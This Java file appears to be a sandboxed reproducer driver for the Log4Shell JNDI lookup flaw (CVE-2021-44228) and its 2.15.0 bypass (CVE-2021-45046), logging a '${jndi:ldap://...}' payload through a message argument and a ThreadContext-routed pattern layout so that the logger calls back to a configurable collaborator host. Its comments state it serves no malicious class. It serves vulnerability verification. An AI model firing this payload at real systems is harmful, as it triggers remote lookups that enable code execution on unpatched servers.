package demo.tegron;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.ThreadContext;

/**
 * Case A reproducer driver — Log4Shell JNDI lookup RCE (CVE-2021-44228), and the
 * incomplete-fix bypass at 2.15.0 (CVE-2021-45046).
 *
 * EFFECT-ONLY (RFC 0003 / RFC 0001 inv. 8): this driver causes log4j to perform
 * an OUTBOUND JNDI lookup against a controlled collaborator. The observable side
 * effect is the network callback that carries the per-trial token. The driver
 * NEVER serves or loads a malicious Java class — it does not weaponize the RCE.
 * The collaborator only RECORDS the inbound connection.
 *
 * Configuration (read from env):
 *   COLLABORATOR_HOST  host of the controlled LDAP/TCP collaborator
 *   COLLABORATOR_PORT  port the collaborator listens on
 *   POE_TOKEN          per-trial token echoed in the JNDI path so the sandbox can
 *                      correlate the callback to this exact run
 *
 * The 2.15.0 failed-fix link requires the lookup to be exercised from a
 * NON-DEFAULT PatternLayout that resolves a Context/Map lookup. We set a
 * ThreadContext value and the runtime log4j2.xml (selected per checkpoint by the
 * Dockerfile) routes that value through a pattern lookup so the 2.15.0 bypass
 * path is reached. The recorded condition is `non_default_pattern_layout`.
 */
public final class CaseADriver {

    private static final Logger LOG = LogManager.getLogger(CaseADriver.class);

    public static void main(String[] args) throws Exception {
        String host  = envOr("COLLABORATOR_HOST", "collaborator");
        String port  = envOr("COLLABORATOR_PORT", "1389");
        String token = envOr("POE_TOKEN", "poe-local");

        // The attacker-controlled string. In a real incident this arrives in a
        // logged field (User-Agent, username, etc.). Here we hand it to the
        // logger directly. The JNDI lookup, if it fires, calls back to the
        // controlled collaborator carrying the token.
        String payload = "${jndi:ldap://" + host + ":" + port + "/poe-" + token + "}";

        // For the 2.15.0 (failed_fix) checkpoint, the bundled log4j2.xml uses a
        // non-default PatternLayout that resolves a Context/Map (${ctx:...})
        // lookup; placing the payload into the ThreadContext routes it through
        // that non-default layout path -> recorded condition non_default_pattern_layout.
        ThreadContext.put("attack", payload);

        System.out.println("[caseA] token=" + token
                + " collaborator=" + host + ":" + port
                + " -> emitting JNDI-bearing log event (effect-only; no RCE payload served)");

        // Two emission paths so the same driver works on default and non-default
        // layouts: (1) message argument, (2) ThreadContext-driven pattern lookup.
        LOG.error("attacker-supplied field: {}", payload);
        LOG.error("context-routed field");        // resolved by ${ctx:attack} in the non-default layout

        ThreadContext.clearAll();

        // Give async appenders / the JNDI resolver time to fire the callback
        // before the JVM exits. The sandbox records the network side-effect.
        Thread.sleep(Long.parseLong(envOr("DWELL_MS", "3000")));
        System.out.println("[caseA] done");
    }

    private static String envOr(String k, String d) {
        String v = System.getenv(k);
        return (v == null || v.isEmpty()) ? d : v;
    }
}
